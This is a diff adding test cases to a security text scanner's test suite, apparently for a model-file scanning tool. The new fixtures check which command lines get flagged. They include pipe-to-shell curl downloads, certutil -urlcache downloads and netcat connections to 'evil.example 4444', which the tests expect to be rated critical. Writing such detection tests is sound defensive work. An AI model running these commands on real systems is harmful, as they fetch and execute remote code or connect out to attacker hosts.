@@ -694,6 +694,10 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
         'RUN ["sh", "-c", "curl https://example.com/artifact | sh"]\n',
         "ADD https://example.com/artifact /tmp/artifact\n",
         "ADD --checksum=sha256:abc https://example.com/artifact /tmp/artifact\n",
+        "# curl https://example.com/artifact | sh\n",
+        "# curl \\\n  https://example.com/artifact | sh\n",
+        "certutil -urlcache -f https://example.com/artifact artifact.exe\n",
+        "certutil.exe -f -urlcache https://example.com/artifact artifact.exe\n",
         "> - curl https://example.com/artifact | sh\n",
         "> 1. wget https://example.com/artifact\n",
     ],
@@ -734,6 +738,10 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         'The command array ["curl", URL] is documented at https://docs.example.com/config.\n',
         "/usr/bin/curl is documented at https://docs.example.com/shell.\n",
         "Docker ADD documentation: https://docs.example.com/dockerfile.\n",
+        "# curl is documented at https://docs.example.com/curl.\n",
+        "# curl is documented at \\\n  https://docs.example.com/curl.\n",
+        "# docs: https://docs.example.com/shell.\n",
+        "The certutil -urlcache command is documented at https://docs.example.com/certutil.\n",
         "> - Use curl for downloads; see https://docs.example.com/shell.\n",
     ],
 )
@@ -770,6 +778,42 @@ def test_text_scanner_ordered_list_shell_prose_remains_informational(tmp_path: P
     result = TextScanner().scan(str(text_path))
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize("command", ["nc", "ncat", "netcat", "/usr/bin/nc", "nc.exe", "# nc"])
+def test_text_scanner_documentation_netcat_destinations_remain_actionable(
+    tmp_path: Path,
+    command: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(f"{command} evil.example 4444\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_command"
+        and check.details.get("destination") == "evil.example"
+        and check.details.get("port") == 4444
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_documentation_netcat_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "The nc command is documented at https://docs.example.com/netcat.\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize(
